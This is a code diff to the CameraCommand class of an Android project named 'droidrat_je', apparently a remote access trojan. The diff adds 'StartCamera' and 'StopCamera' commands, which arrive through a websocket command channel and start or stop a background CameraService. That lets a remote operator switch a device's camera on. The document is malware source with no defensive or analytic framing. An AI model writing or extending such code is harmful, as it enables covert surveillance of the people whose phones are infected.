@@ -1,17 +1,23 @@
 package com.je_chen.droidrat_je.command;
 
 import android.content.Context;
+import android.content.Intent;
 
 import com.je_chen.droidrat_je.command.process_super.CommandFather;
+import com.je_chen.droidrat_je.service.camera.CameraService;
 
+import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;
 import static com.je_chen.droidrat_je.service.command.ProcessCommandService.websocket;
 
-public class CameraCommand extends CommandFather{
+public class CameraCommand extends CommandFather {
 
     private Context context;
 
-    public CameraCommand(Context context){
+    private CameraService cameraService;
+
+    public CameraCommand(Context context) {
         this.context = context;
+        cameraService = new CameraService();
     }
 
     @Override
@@ -24,6 +30,18 @@ public class CameraCommand extends CommandFather{
         try {
             String[] rawCommandArray = command.split(" ");
             switch (rawCommandArray[1]) {
+
+                case "StartCamera":
+                    Intent startCameraIntent = new Intent(context,CameraService.class);
+                    startCameraIntent.setFlags(FLAG_ACTIVITY_NEW_TASK);
+                    context.startService(startCameraIntent);
+                    break;
+
+                case "StopCamera":
+                    Intent stopCameraIntent = new Intent(context,CameraService.class);
+                    stopCameraIntent.setFlags(FLAG_ACTIVITY_NEW_TASK);
+                    context.stopService(stopCameraIntent);
+                    break;
 
             }
         } catch (Exception e) {
